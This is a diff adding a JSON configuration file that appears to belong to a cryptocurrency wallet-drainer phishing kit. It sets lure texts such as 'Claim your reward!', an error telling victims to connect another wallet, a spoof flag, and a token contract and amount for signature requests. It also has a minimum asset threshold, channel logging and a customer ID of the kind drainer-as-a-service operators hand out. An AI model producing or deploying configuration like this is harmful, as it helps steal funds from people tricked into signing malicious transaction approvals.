@@ -1,0 +1,29 @@
+{
+  "SPOOF": "1000",
+  "ELEVEN_PRIORITY": "1.7",
+  "TRAFFIC": "Eleven my bestie!",
+  "BUNDLES_7702": false,
+  "MODAL_AUTOOPEN": false,
+  "ASSET_MIN": "30",
+  "MODAL_STYLE": "1",
+  "DARK_MODE": true,
+  "LOADING_MESSAGE": "Processing",
+  "CONFIRM_MESSAGE": "Please confirm the transaction",
+  "ERROR_MESSAGE": "Please connect another wallet",
+  "TX_RETRY_COUNT": "3",
+  "VERIFY_SIGNATURE": "0",
+  "LOGS_TO_THE_CHANNEL": "0",
+  "FULL_LOG_URL": false,
+  "SIG_TEXT_ERROR": "An authorization error occurred",
+  "SIG_TEXT_PROMPT": "Claim your reward!",
+  "SIG_FROM": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+  "SIG_CONFIG": [
+    {
+      "itemType": 1,
+      "token": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      "amount": "500000000"
+    }
+  ],
+  "CUSTOMER_ID": "B083-C93F-A874",
+  "REOWN_ID": "946eb77661480fd014c38f42431f913b"
+}
